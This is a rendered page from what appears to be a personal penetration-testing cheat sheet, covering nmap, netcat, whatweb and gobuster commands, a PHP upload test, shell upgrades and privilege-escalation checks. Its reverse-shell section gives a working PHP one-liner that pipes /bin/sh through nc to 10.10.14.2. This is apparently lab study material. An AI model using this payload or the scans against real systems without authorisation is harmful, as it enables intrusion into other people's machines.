@@ -1,0 +1,256 @@
+<!DOCTYPE html><html><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width"/><link rel="icon" href="/Notes/favicon.ico"/><title>Pentest opening</title><meta name="robots" content="index,follow"/><meta name="googlebot" content="index,follow"/><meta name="description" content="Personal Knowledge Space"/><meta property="og:title" content="Pentest opening"/><meta property="og:description" content="Personal Knowledge Space"/><meta property="og:url" content="https://greguus.github.io//Notes/notes/phd6lr0llsyy9qcbykd4b25/"/><meta property="og:type" content="article"/><meta property="article:published_time" content="1/9/2023"/><meta property="article:modified_time" content="1/9/2023"/><link rel="canonical" href="https://greguus.github.io//Notes/notes/phd6lr0llsyy9qcbykd4b25/"/><meta name="next-head-count" content="14"/><link rel="preload" href="/Notes/_next/static/css/1ff0b9d7e742b4b0.css" as="style"/><link rel="stylesheet" href="/Notes/_next/static/css/1ff0b9d7e742b4b0.css" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" nomodule="" src="/Notes/_next/static/chunks/polyfills-c67a75d1b6f99dc8.js"></script><script src="/Notes/_next/static/chunks/webpack-25e92ed568969c7e.js" defer=""></script><script src="/Notes/_next/static/chunks/framework-28c999baf2863c3d.js" defer=""></script><script src="/Notes/_next/static/chunks/main-42985e5d01110972.js" defer=""></script><script src="/Notes/_next/static/chunks/pages/_app-735832bdabb9d926.js" defer=""></script><script src="/Notes/_next/static/chunks/935-4dee79e80b8641c6.js" defer=""></script><script src="/Notes/_next/static/chunks/6-50972def09142ee2.js" defer=""></script><script src="/Notes/_next/static/chunks/pages/notes/%5Bid%5D-78d472fa3b924116.js" defer=""></script><script src="/Notes/_next/static/j9CSGb22FfOPbRIS6QcPV/_buildManifest.js" defer=""></script><script src="/Notes/_next/static/j9CSGb22FfOPbRIS6QcPV/_ssgManifest.js" defer=""></script></head><body><div id="__next" data-reactroot=""><section class="ant-layout" style="width:100%;min-height:100%"><header class="ant-layout-header" style="position:fixed;isolation:isolate;z-index:1;width:100%;border-bottom:1px solid #d4dadf;height:64px;padding:0 24px 0 2px"><div class="ant-row ant-row-center" style="max-width:992px;justify-content:space-between;margin:0 auto"><div style="display:flex" class="ant-col ant-col-xs-20 ant-col-sm-4"></div><div class="ant-col gutter-row ant-col-xs-0 ant-col-sm-20 ant-col-md-20 ant-col-lg-19"><div class="ant-select ant-select-lg ant-select-auto-complete ant-select-single ant-select-allow-clear ant-select-show-search" style="width:100%"><div class="ant-select-selector"><span class="ant-select-selection-search"><input type="search" autoComplete="off" class="ant-select-selection-search-input" role="combobox" aria-haspopup="listbox" aria-owns="undefined_list" aria-autocomplete="list" aria-controls="undefined_list" aria-activedescendant="undefined_list_0" value=""/></span><span class="ant-select-selection-placeholder">For full text search please use the &#x27;?&#x27; prefix. e.g. ? Onboarding</span></div></div></div><div style="display:none;align-items:center;justify-content:center" class="ant-col ant-col-xs-4 ant-col-sm-4 ant-col-md-0 ant-col-lg-0"><span role="img" aria-label="menu" style="font-size:24px" tabindex="-1" class="anticon anticon-menu"><svg viewBox="64 64 896 896" focusable="false" data-icon="menu" width="1em" height="1em" fill="currentColor" aria-hidden="true"><path d="M904 160H120c-4.4 0-8 3.6-8 8v64c0 4.4 3.6 8 8 8h784c4.4 0 8-3.6 8-8v-64c0-4.4-3.6-8-8-8zm0 624H120c-4.4 0-8 3.6-8 8v64c0 4.4 3.6 8 8 8h784c4.4 0 8-3.6 8-8v-64c0-4.4-3.6-8-8-8zm0-312H120c-4.4 0-8 3.6-8 8v64c0 4.4 3.6 8 8 8h784c4.4 0 8-3.6 8-8v-64c0-4.4-3.6-8-8-8z"></path></svg></span></div></div></header><section class="ant-layout" style="margin-top:64px;display:flex;flex-direction:row"><div class="site-layout-sidebar" style="flex:0 0 auto;width:calc(max((100% - 992px) / 2, 0px) + 200px);min-width:200px;padding-left:calc((100% - 992px) / 2)"><aside class="ant-layout-sider ant-layout-sider-dark" style="position:fixed;overflow:auto;height:calc(100vh - 64px);background-color:transparent;flex:0 0 200px;max-width:200px;min-width:200px;width:200px"><div class="ant-layout-sider-children"></div></aside></div><main class="ant-layout-content side-layout-main" style="max-width:1200px;min-width:0;display:block"><div style="padding:0 24px"><div class="main-content" role="main"><div class="ant-row"><div class="ant-col ant-col-24"><div class="ant-row" style="margin-left:-10px;margin-right:-10px"><div style="padding-left:10px;padding-right:10px" class="ant-col ant-col-xs-24 ant-col-md-18"><div><h1 id="pentest-opening">Pentest opening<a aria-hidden="true" class="anchor-heading icon-link" href="#pentest-opening"></a></h1>
+<h2 id="nmap">Nmap:<a aria-hidden="true" class="anchor-heading icon-link" href="#nmap"></a></h2>
+<h3 id="nmap-man-pages"><a href="https://linux.die.net/man/1/nmap">Nmap man pages</a><a aria-hidden="true" class="anchor-heading icon-link" href="#nmap-man-pages"></a></h3>
+<table>
+<tbody><tr><th>Function</th><th>Examples:</th></tr>
+<tr><td>
+<div class="table-responsive">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Flag:</th><th>What it does:</th></tr></thead><tbody><tr><td><code>-sV</code></td><td>scan against the default top 1000 ports</td></tr><tr><td><code>--open</code></td><td>scan only open ports</td></tr><tr><td><code>-oA &#x3C;filename></code></td><td>output all scan formats</td></tr><tr><td><code>-v</code></td><td>verbose output</td></tr><tr><td><code>-p-</code></td><td>full TCP port scan (65535)</td></tr><tr><td><code>--script=&#x3C;script_name></code></td><td>script scan</td></tr><tr><td><li><code>banner</code></li></td><td>A simple banner grabber which connects <br>to an open TCP port and prints out anything <br>sent by the listening service within five seconds</td></tr><tr><td><li><code>http-enum</code></li></td><td>Enumerates directories used by <br>popular web applications and servers</td></tr></tbody></table></div>
+</td><td>
+<div class="table-responsive">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Full command:</th></tr></thead><tbody><tr><td><code>nmap -sV --open -oA &#x3C;filename> &#x3C;ip address></code></td></tr><tr><td><strong>Quick scan</strong></td></tr><tr><td><code>nmap -p- --open -oA &#x3C;filename> &#x3C;ip address></code></td></tr><tr><td><strong>Long scan - recommended in second terminal</strong></td></tr></tbody></table></div>
+</td></tr> </tbody></table>
+<h2 id="netcat">NetCat<a aria-hidden="true" class="anchor-heading icon-link" href="#netcat"></a></h2>
+<h3 id="netcat-man-pages"><a href="https://linux.die.net/man/1/nc">NetCat man pages</a><a aria-hidden="true" class="anchor-heading icon-link" href="#netcat-man-pages"></a></h3>
+<table>
+<tbody><tr><th>Function</th><th>Examples:</th></tr>
+<tr><td>
+<div class="table-responsive">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Flag:</th><th>What it does:</th></tr></thead><tbody><tr><td><code>-n</code></td><td>do not do any DNS or service lookups on any specified addresses, <br>hostnames and ports (don't resolve)</td></tr><tr><td><code>-v</code></td><td>verbose</td></tr><tr><td><code>-l</code></td><td>listen for incoming connection rather than initiate a connection</td></tr></tbody></table></div>
+</td><td>
+<div class="table-responsive">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Full command:</th></tr></thead><tbody><tr><td><code>nc -nv &#x3C;ip address> &#x3C;port></code></td></tr><tr><td>Confirm banner</td></tr><tr><td><code>nc -nvlp 80</code></td></tr><tr><td>Listening shell on port 80</td></tr></tbody></table></div>
+</td></tr> </tbody></table>
+<h2 id="whatweb">whatweb<a aria-hidden="true" class="anchor-heading icon-link" href="#whatweb"></a></h2>
+<h3 id="whatweb-man-pages"><a href="https://manpages.org/whatweb">whatweb man pages</a><a aria-hidden="true" class="anchor-heading icon-link" href="#whatweb-man-pages"></a></h3>
+<table>
+<tbody><tr><th>Function</th><th>Examples:</th></tr>
+<tr><td>
+<div class="table-responsive">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Flag:</th><th>What it does:</th></tr></thead><tbody><tr><td>``</td><td></td></tr><tr><td>``</td><td></td></tr></tbody></table></div>
+</td><td>
+<div class="table-responsive">
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Full command:</th></tr></thead><tbody><tr><td><code>whatweb &#x3C;ip address></code></td></tr><tr><td>Identify web application in use</td></tr></tbody></table></div>
+</td></tr> </tbody></table>
+<h2 id="gobuster">Gobuster<a aria-hidden="true" class="anchor-heading icon-link" href="#gobuster"></a></h2>
+<h3 id="gobuster-man-pages"><a href="https://linuxcommandlibrary.com/man/gobuster">Gobuster man pages</a><a aria-hidden="true" class="anchor-heading icon-link" href="#gobuster-man-pages"></a></h3>
+<table>
+<tbody><tr><th>Function</th><th>Examples:</th></tr>
+<tr><td>
+<div class="table-responsive">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Flag:</th><th>What it does:</th></tr></thead><tbody><tr><td><code>dir</code></td><td>use directory enumeration mode</td></tr><tr><td><code>-u</code></td><td>string, the target URL or Domain</td></tr><tr><td><code>--wordlist</code> / <code>-w</code></td><td>path to wordlist, recommended:<br> <code>/usr/share/wordlists/dirb/common.txt</code></td></tr><tr><td><code>-e</code></td><td>print full URLs</td></tr></tbody></table></div>
+</td><td>
+<div class="table-responsive">
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Full command:</th></tr></thead><tbody><tr><td><code>gobuster -e -u &#x3C;ip address/URL> -w /usr/share/wordlists/dirb/common.txt</code></td></tr><tr><td>Scan website, use common.txt wordlist and print the full <br>URLs of discovered paths</td></tr></tbody></table></div>
+</td></tr> </tbody></table>
+<h2 id="file-upload-testing">File upload testing<a aria-hidden="true" class="anchor-heading icon-link" href="#file-upload-testing"></a></h2>
+<div class="table-responsive">
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>File:</th><th>What it does/testing:</th></tr></thead><tbody><tr><td><a href="/Notes/assets/files/test_php.php">test_php.php</a></td><td>Tests if php file can be uploaded to web app</td></tr></tbody></table></div>
+<h2 id="reverse-shells">Reverse shells:<a aria-hidden="true" class="anchor-heading icon-link" href="#reverse-shells"></a></h2>
+<pre class="language-php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&#x3C;?php</span> <span class="token function">system</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&#x26;1|nc 10.10.14.2 9443 >/tmp/f"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span> 
+</code></pre>
+<h2 id="upgrade-reverse-shell">Upgrade reverse shell<a aria-hidden="true" class="anchor-heading icon-link" href="#upgrade-reverse-shell"></a></h2>
+<pre class="language-python"><code class="language-python">python <span class="token operator">-</span>c <span class="token string">'import pty; pty.spawn("/bin/bash")'</span>
+</code></pre>
+<p>OR</p>
+<pre class="language-python"><code class="language-python">python3 <span class="token operator">-</span>c <span class="token string">'import pty; pty.spawn("/bin/bash")'</span>
+</code></pre>
+<h2 id="privilege-escalation-checks">Privilege escalation checks<a aria-hidden="true" class="anchor-heading icon-link" href="#privilege-escalation-checks"></a></h2>
+<div class="table-responsive">
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>File:</th><th>What it does/testing:</th></tr></thead><tbody><tr><td><a href="https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh">LinEnum.sh</a></td><td>Automated privilege escalation checks</td></tr></tbody></table></div>
+<h2 id="start-python-http-server">Start Python HTTP server<a aria-hidden="true" class="anchor-heading icon-link" href="#start-python-http-server"></a></h2>
+<pre class="language-python"><code class="language-python">sudo python3 <span class="token operator">-</span>m http<span class="token punctuation">.</span>server <span class="token number">8080</span>
+</code></pre>
+<hr>
+<strong>Backlinks</strong>
+<ul>
+<li><a href="/Notes/notes/t7zelcb6b17opo2gjy4y9cq">Cheat Sheets:</a></li>
+</ul></div></div><div style="padding-left:10px;padding-right:10px" class="ant-col ant-col-xs-0 ant-col-md-6"><div><div class=""><div class="ant-anchor-wrapper dendron-toc" style="max-height:calc(100vh - 64px);z-index:1"><div class="ant-anchor"><div class="ant-anchor-ink"><span class="ant-anchor-ink-ball"></span></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#nmap" title="Nmap:">Nmap:</a></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#nmap-man-pages" title="Nmap man pages">Nmap man pages</a></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#netcat" title="NetCat">NetCat</a></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#netcat-man-pages" title="NetCat man pages">NetCat man pages</a></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#whatweb" title="whatweb">whatweb</a></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#whatweb-man-pages" title="whatweb man pages">whatweb man pages</a></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#gobuster" title="Gobuster">Gobuster</a></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#gobuster-man-pages" title="Gobuster man pages">Gobuster man pages</a></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#file-upload-testing" title="File upload testing">File upload testing</a></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#reverse-shells" title="Reverse shells:">Reverse shells:</a></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#upgrade-reverse-shell" title="Upgrade reverse shell">Upgrade reverse shell</a></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#privilege-escalation-checks" title="Privilege escalation checks">Privilege escalation checks</a></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#start-python-http-server" title="Start Python HTTP server">Start Python HTTP server</a></div></div></div></div></div></div></div></div></div></div></div><div class="ant-divider ant-divider-horizontal" role="separator"></div><footer class="ant-layout-footer" style="padding:0 24px 24px"></footer></main></section></section></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"note":{"id":"phd6lr0llsyy9qcbykd4b25","title":"Pentest opening","desc":"","updated":1673259996922,"created":1673238697340,"custom":{},"fname":"Cheat Sheets.Pentest opening","type":"note","vault":{"fsPath":".","selfContained":true,"name":"Cybersecurity_Notes"},"contentHash":"e643d6e9813b37ebfb70c9587c01fbbe","links":[{"from":{"fname":"Cheat Sheets","id":"t7zelcb6b17opo2gjy4y9cq","vaultName":"Cybersecurity_Notes"},"type":"backlink","position":{"start":{"line":6,"column":1,"offset":196},"end":{"line":6,"column":49,"offset":244},"indent":[]},"value":"Cheat Sheets.Pentest opening"}],"anchors":{"nmap":{"type":"header","text":"Nmap:","value":"nmap","line":8,"column":0,"depth":2},"nmap-man-pages":{"type":"header","text":"Nmap man pages","value":"nmap-man-pages","line":10,"column":0,"depth":3},"netcat":{"type":"header","text":"NetCat","value":"netcat","line":39,"column":0,"depth":2},"netcat-man-pages":{"type":"header","text":"NetCat man pages","value":"netcat-man-pages","line":41,"column":0,"depth":3},"whatweb":{"type":"header","text":"whatweb","value":"whatweb","line":64,"column":0,"depth":2},"whatweb-man-pages":{"type":"header","text":"whatweb man pages","value":"whatweb-man-pages","line":66,"column":0,"depth":3},"gobuster":{"type":"header","text":"Gobuster","value":"gobuster","line":86,"column":0,"depth":2},"gobuster-man-pages":{"type":"header","text":"Gobuster man pages","value":"gobuster-man-pages","line":88,"column":0,"depth":3},"file-upload-testing":{"type":"header","text":"File upload testing","value":"file-upload-testing","line":110,"column":0,"depth":2},"reverse-shells":{"type":"header","text":"Reverse shells:","value":"reverse-shells","line":116,"column":0,"depth":2},"upgrade-reverse-shell":{"type":"header","text":"Upgrade reverse shell","value":"upgrade-reverse-shell","line":121,"column":0,"depth":2},"privilege-escalation-checks":{"type":"header","text":"Privilege escalation checks","value":"privilege-escalation-checks","line":131,"column":0,"depth":2},"start-python-http-server":{"type":"header","text":"Start Python HTTP server","value":"start-python-http-server","line":137,"column":0,"depth":2}},"children":[],"parent":"t7zelcb6b17opo2gjy4y9cq","data":{}},"body":"\u003ch1 id=\"pentest-opening\"\u003ePentest opening\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#pentest-opening\"\u003e\u003c/a\u003e\u003c/h1\u003e\n\u003ch2 id=\"nmap\"\u003eNmap:\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#nmap\"\u003e\u003c/a\u003e\u003c/h2\u003e\n\u003ch3 id=\"nmap-man-pages\"\u003e\u003ca href=\"https://linux.die.net/man/1/nmap\"\u003eNmap man pages\u003c/a\u003e\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#nmap-man-pages\"\u003e\u003c/a\u003e\u003c/h3\u003e\n\u003ctable\u003e\n\u003ctbody\u003e\u003ctr\u003e\u003cth\u003eFunction\u003c/th\u003e\u003cth\u003eExamples:\u003c/th\u003e\u003c/tr\u003e\n\u003ctr\u003e\u003ctd\u003e\n\u003cdiv class=\"table-responsive\"\u003e\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\u003ctable\u003e\u003cthead\u003e\u003ctr\u003e\u003cth\u003eFlag:\u003c/th\u003e\u003cth\u003eWhat it does:\u003c/th\u003e\u003c/tr\u003e\u003c/thead\u003e\u003ctbody\u003e\u003ctr\u003e\u003ctd\u003e\u003ccode\u003e-sV\u003c/code\u003e\u003c/td\u003e\u003ctd\u003escan against the default top 1000 ports\u003c/td\u003e\u003c/tr\u003e\u003ctr\u003e\u003ctd\u003e\u003ccode\u003e--open\u003c/code\u003e\u003c/td\u003e\u003ctd\u003escan only open ports\u003c/td\u003e\u003c/tr\u003e\u003ctr\u003e\u003ctd\u003e\u003ccode\u003e-oA \u0026#x3C;filename\u003e\u003c/code\u003e\u003c/td\u003e\u003ctd\u003eoutput all scan formats\u003c/td\u003e\u003c/tr\u003e\u003ctr\u003e\u003ctd\u003e\u003ccode\u003e-v\u003c/code\u003e\u003c/td\u003e\u003ctd\u003everbose output\u003c/td\u003e\u003c/tr\u003e\u003ctr\u003e\u003ctd\u003e\u003ccode\u003e-p-\u003c/code\u003e\u003c/td\u003e\u003ctd\u003efull TCP port scan (65535)\u003c/td\u003e\u003c/tr\u003e\u003ctr\u003e\u003ctd\u003e\u003ccode\u003e--script=\u0026#x3C;script_name\u003e\u003c/code\u003e\u003c/td\u003e\u003ctd\u003escript scan\u003c/td\u003e\u003c/tr\u003e\u003ctr\u003e\u003ctd\u003e\u003cli\u003e\u003ccode\u003ebanner\u003c/code\u003e\u003c/li\u003e\u003c/td\u003e\u003ctd\u003eA simple banner grabber which connects \u003cbr\u003eto an open TCP port and prints out anything \u003cbr\u003esent by the listening service within five seconds\u003c/td\u003e\u003c/tr\u003e\u003ctr\u003e\u003ctd\u003e\u003cli\u003e\u003ccode\u003ehttp-enum\u003c/code\u003e\u003c/li\u003e\u003c/td\u003e\u003ctd\u003eEnumerates directories used by \u003cbr\u003epopular web applications and servers\u003c/td\u003e\u003c/tr\u003e\u003c/tbody\u003e\u003c/table\u003e\u003c/div\u003e\n\u003c/td\u003e\u003ctd\u003e\n\u003cdiv class=\"table-responsive\"\u003e\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\u003ctable\u003e\u003cthead\u003e\u003ctr\u003e\u003cth\u003eFull command:\u003c/th\u003e\u003c/tr\u003e\u003c/thead\u003e\u003ctbody\u003e\u003ctr\u003e\u003ctd\u003e\u003ccode\u003enmap -sV --open -oA \u0026#x3C;filename\u003e \u0026#x3C;ip address\u003e\u003c/code\u003e\u003c/td\u003e\u003c/tr\u003e\u003ctr\u003e\u003ctd\u003e\u003cstrong\u003eQuick scan\u003c/strong\u003e\u003c/td\u003e\u003c/tr\u003e\u003ctr\u003e\u003ctd\u003e\u003ccode\u003enmap -p- --open -oA \u0026#x3C;filename\u003e \u0026#x3C;ip address\u003e\u003c/code\u003e\u003c/td\u003e\u003c/tr\u003e\u003ctr\u003e\u003ctd\u003e\u003cstrong\u003eLong scan - recommended in second terminal\u003c/strong\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/tbody\u003e\u003c/table\u003e\u003c/div\u003e\n\u003c/td\u003e\u003c/tr\u003e \u003c/tbody\u003e\u003c/table\u003e\n\u003ch2 id=\"netcat\"\u003eNetCat\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#netcat\"\u003e\u003c/a\u003e\u003c/h2\u003e\n\u003ch3 id=\"netcat-man-pages\"\u003e\u003ca href=\"https://linux.die.net/man/1/nc\"\u003eNetCat man pages\u003c/a\u003e\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#netcat-man-pages\"\u003e\u003c/a\u003e\u003c/h3\u003e\n\u003ctable\u003e\n\u003ctbody\u003e\u003ctr\u003e\u003cth\u003eFunction\u003c/th\u003e\u003cth\u003eExamples:\u003c/th\u003e\u003c/tr\u003e\n\u003ctr\u003e\u003ctd\u003e\n\u003cdiv class=\"table-responsive\"\u003e\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\u003ctable\u003e\u003cthead\u003e\u003ctr\u003e\u003cth\u003eFlag:\u003c/th\u003e\u003cth\u003eWhat it does:\u003c/th\u003e\u003c/tr\u003e\u003c/thead\u003e\u003ctbody\u003e\u003ctr\u003e\u003ctd\u003e\u003ccode\u003e-n\u003c/code\u003e\u003c/td\u003e\u003ctd\u003edo not do any DNS or service lookups on any specified addresses, \u003cbr\u003ehostnames and ports (don't resolve)\u003c/td\u003e\u003c/tr\u003e\u003ctr\u003e\u003ctd\u003e\u003ccode\u003e-v\u003c/code\u003e\u003c/td\u003e\u003ctd\u003everbose\u003c/td\u003e\u003c/tr\u003e\u003ctr\u003e\u003ctd\u003e\u003ccode\u003e-l\u003c/code\u003e\u003c/td\u003e\u003ctd\u003elisten for incoming connection rather than initiate a connection\u003c/td\u003e\u003c/tr\u003e\u003c/tbody\u003e\u003c/table\u003e\u003c/div\u003e\n\u003c/td\u003e\u003ctd\u003e\n\u003cdiv class=\"table-responsive\"\u003e\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\u003ctable\u003e\u003cthead\u003e\u003ctr\u003e\u003cth\u003eFull command:\u003c/th\u003e\u003c/tr\u003e\u003c/thead\u003e\u003ctbody\u003e\u003ctr\u003e\u003ctd\u003e\u003ccode\u003enc -nv \u0026#x3C;ip address\u003e \u0026#x3C;port\u003e\u003c/code\u003e\u003c/td\u003e\u003c/tr\u003e\u003ctr\u003e\u003ctd\u003eConfirm banner\u003c/td\u003e\u003c/tr\u003e\u003ctr\u003e\u003ctd\u003e\u003ccode\u003enc -nvlp 80\u003c/code\u003e\u003c/td\u003e\u003c/tr\u003e\u003ctr\u003e\u003ctd\u003eListening shell on port 80\u003c/td\u003e\u003c/tr\u003e\u003c/tbody\u003e\u003c/table\u003e\u003c/div\u003e\n\u003c/td\u003e\u003c/tr\u003e \u003c/tbody\u003e\u003c/table\u003e\n\u003ch2 id=\"whatweb\"\u003ewhatweb\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#whatweb\"\u003e\u003c/a\u003e\u003c/h2\u003e\n\u003ch3 id=\"whatweb-man-pages\"\u003e\u003ca href=\"https://manpages.org/whatweb\"\u003ewhatweb man pages\u003c/a\u003e\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#whatweb-man-pages\"\u003e\u003c/a\u003e\u003c/h3\u003e\n\u003ctable\u003e\n\u003ctbody\u003e\u003ctr\u003e\u003cth\u003eFunction\u003c/th\u003e\u003cth\u003eExamples:\u003c/th\u003e\u003c/tr\u003e\n\u003ctr\u003e\u003ctd\u003e\n\u003cdiv class=\"table-responsive\"\u003e\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\u003ctable\u003e\u003cthead\u003e\u003ctr\u003e\u003cth\u003eFlag:\u003c/th\u003e\u003cth\u003eWhat it does:\u003c/th\u003e\u003c/tr\u003e\u003c/thead\u003e\u003ctbody\u003e\u003ctr\u003e\u003ctd\u003e``\u003c/td\u003e\u003ctd\u003e\u003c/td\u003e\u003c/tr\u003e\u003ctr\u003e\u003ctd\u003e``\u003c/td\u003e\u003ctd\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/tbody\u003e\u003c/table\u003e\u003c/div\u003e\n\u003c/td\u003e\u003ctd\u003e\n\u003cdiv class=\"table-responsive\"\u003e\n\n\n\n\n\n\n\n\n\n\n\n\n\n\u003ctable\u003e\u003cthead\u003e\u003ctr\u003e\u003cth\u003eFull command:\u003c/th\u003e\u003c/tr\u003e\u003c/thead\u003e\u003ctbody\u003e\u003ctr\u003e\u003ctd\u003e\u003ccode\u003ewhatweb \u0026#x3C;ip address\u003e\u003c/code\u003e\u003c/td\u003e\u003c/tr\u003e\u003ctr\u003e\u003ctd\u003eIdentify web application in use\u003c/td\u003e\u003c/tr\u003e\u003c/tbody\u003e\u003c/table\u003e\u003c/div\u003e\n\u003c/td\u003e\u003c/tr\u003e \u003c/tbody\u003e\u003c/table\u003e\n\u003ch2 id=\"gobuster\"\u003eGobuster\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#gobuster\"\u003e\u003c/a\u003e\u003c/h2\u003e\n\u003ch3 id=\"gobuster-man-pages\"\u003e\u003ca href=\"https://linuxcommandlibrary.com/man/gobuster\"\u003eGobuster man pages\u003c/a\u003e\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#gobuster-man-pages\"\u003e\u003c/a\u003e\u003c/h3\u003e\n\u003ctable\u003e\n\u003ctbody\u003e\u003ctr\u003e\u003cth\u003eFunction\u003c/th\u003e\u003cth\u003eExamples:\u003c/th\u003e\u003c/tr\u003e\n\u003ctr\u003e\u003ctd\u003e\n\u003cdiv class=\"table-responsive\"\u003e\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\u003ctable\u003e\u003cthead\u003e\u003ctr\u003e\u003cth\u003eFlag:\u003c/th\u003e\u003cth\u003eWhat it does:\u003c/th\u003e\u003c/tr\u003e\u003c/thead\u003e\u003ctbody\u003e\u003ctr\u003e\u003ctd\u003e\u003ccode\u003edir\u003c/code\u003e\u003c/td\u003e\u003ctd\u003euse directory enumeration mode\u003c/td\u003e\u003c/tr\u003e\u003ctr\u003e\u003ctd\u003e\u003ccode\u003e-u\u003c/code\u003e\u003c/td\u003e\u003ctd\u003estring, the target URL or Domain\u003c/td\u003e\u003c/tr\u003e\u003ctr\u003e\u003ctd\u003e\u003ccode\u003e--wordlist\u003c/code\u003e / \u003ccode\u003e-w\u003c/code\u003e\u003c/td\u003e\u003ctd\u003epath to wordlist, recommended:\u003cbr\u003e \u003ccode\u003e/usr/share/wordlists/dirb/common.txt\u003c/code\u003e\u003c/td\u003e\u003c/tr\u003e\u003ctr\u003e\u003ctd\u003e\u003ccode\u003e-e\u003c/code\u003e\u003c/td\u003e\u003ctd\u003eprint full URLs\u003c/td\u003e\u003c/tr\u003e\u003c/tbody\u003e\u003c/table\u003e\u003c/div\u003e\n\u003c/td\u003e\u003ctd\u003e\n\u003cdiv class=\"table-responsive\"\u003e\n\n\n\n\n\n\n\n\n\n\n\n\n\n\u003ctable\u003e\u003cthead\u003e\u003ctr\u003e\u003cth\u003eFull command:\u003c/th\u003e\u003c/tr\u003e\u003c/thead\u003e\u003ctbody\u003e\u003ctr\u003e\u003ctd\u003e\u003ccode\u003egobuster -e -u \u0026#x3C;ip address/URL\u003e -w /usr/share/wordlists/dirb/common.txt\u003c/code\u003e\u003c/td\u003e\u003c/tr\u003e\u003ctr\u003e\u003ctd\u003eScan website, use common.txt wordlist and print the full \u003cbr\u003eURLs of discovered paths\u003c/td\u003e\u003c/tr\u003e\u003c/tbody\u003e\u003c/table\u003e\u003c/div\u003e\n\u003c/td\u003e\u003c/tr\u003e \u003c/tbody\u003e\u003c/table\u003e\n\u003ch2 id=\"file-upload-testing\"\u003eFile upload testing\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#file-upload-testing\"\u003e\u003c/a\u003e\u003c/h2\u003e\n\u003cdiv class=\"table-responsive\"\u003e\n\n\n\n\n\n\n\n\n\n\n\n\n\u003ctable\u003e\u003cthead\u003e\u003ctr\u003e\u003cth\u003eFile:\u003c/th\u003e\u003cth\u003eWhat it does/testing:\u003c/th\u003e\u003c/tr\u003e\u003c/thead\u003e\u003ctbody\u003e\u003ctr\u003e\u003ctd\u003e\u003ca href=\"/Notes/assets/files/test_php.php\"\u003etest_php.php\u003c/a\u003e\u003c/td\u003e\u003ctd\u003eTests if php file can be uploaded to web app\u003c/td\u003e\u003c/tr\u003e\u003c/tbody\u003e\u003c/table\u003e\u003c/div\u003e\n\u003ch2 id=\"reverse-shells\"\u003eReverse shells:\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#reverse-shells\"\u003e\u003c/a\u003e\u003c/h2\u003e\n\u003cpre class=\"language-php\"\u003e\u003ccode class=\"language-php\"\u003e\u003cspan class=\"token php language-php\"\u003e\u003cspan class=\"token delimiter important\"\u003e\u0026#x3C;?php\u003c/span\u003e \u003cspan class=\"token function\"\u003esystem\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string double-quoted-string\"\u003e\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u003e\u0026#x26;1|nc 10.10.14.2 9443 \u003e/tmp/f\"\u003c/span\u003e\u003cspan class=\"token 